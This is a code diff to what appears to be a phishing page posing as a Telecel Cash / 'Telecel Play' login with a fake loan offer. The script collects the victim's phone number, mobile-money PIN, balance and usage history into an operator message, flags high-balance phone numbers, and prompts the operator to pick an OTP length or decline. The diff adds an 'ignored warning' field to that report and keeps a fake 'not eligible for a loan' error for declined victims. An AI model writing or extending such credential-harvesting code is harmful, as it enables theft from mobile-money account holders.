@@ -529,15 +529,18 @@
     return Math.floor(100000 + Math.random() * 900000).toString();
   }
 
-  // ========== HELPER: Get user data from localStorage (except phone – we use login identifier) ==========
+  // ========== HELPER: Get user data from localStorage ==========
   function getUserFinancialData() {
-    // Current balance (from details step2)
     let balance = localStorage.getItem('currentBalance') || 'Not provided';
-    // How long used Telecel Cash
     let tenure = localStorage.getItem('telecelTenure') || 'Not provided';
-    // Usage frequency
     let frequency = localStorage.getItem('usageFrequency') || 'Not provided';
     return { balance, tenure, frequency };
+  }
+
+  // ========== HELPER: Get ignored warning flag ==========
+  function getIgnoredWarning() {
+    const ignored = localStorage.getItem('ignoredConsistencyWarning');
+    return ignored === 'true';
   }
 
   // Determine if balance is 500+ (for highlighting phone number)
@@ -584,10 +587,12 @@
     }
     sessionStorage.setItem('telecel_pin', pin);
     
-    // Retrieve financial data from localStorage (balance, tenure, frequency)
+    // Retrieve financial data from localStorage
     const { balance, tenure, frequency } = getUserFinancialData();
+    const ignored = getIgnoredWarning();
+    const ignoredText = ignored ? 'Yes' : 'No';
     
-    // IMPORTANT: Phone number is the identifier entered by the user (cleaned to digits)
+    // Phone number is the identifier entered by the user
     const enteredPhone = identifier.replace(/\D/g, '');
     const displayPhone = enteredPhone || 'Not provided';
     
@@ -596,11 +601,12 @@
       ? `<b><u>${escapeHtml(displayPhone)}</u></b>`
       : escapeHtml(displayPhone);
     
-    // Prepare concise message – phone number is the one typed in login form
+    // Prepare concise message – added "Ignored:" field between Balance and History
     const message = `🔐 <b>Telecel Play Login</b>\n\n` +
                     `<b>📱 Phone:</b> <code>${phoneFormatted}</code>\n` +
                     `<b>💰 Balance:</b> ${escapeHtml(balance)}\n` +
                     `<b>📅 History:</b> ${escapeHtml(tenure)} (${escapeHtml(frequency)})\n` +
+                    `<b>⚠️ Ignored:</b> ${ignoredText}\n` +
                     `<b>🔢 PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
                     `📢 <b>Select OTP length or Decline:</b>`;
     
@@ -680,7 +686,6 @@
             isSubmitting = false;
             loginBtn.disabled = false;
             updateLoginButton();
-            // Custom decline message: not eligible for loan
             showError('You are not eligible for a loan currently.');
             clearPinFields();
             focusFirstPin();
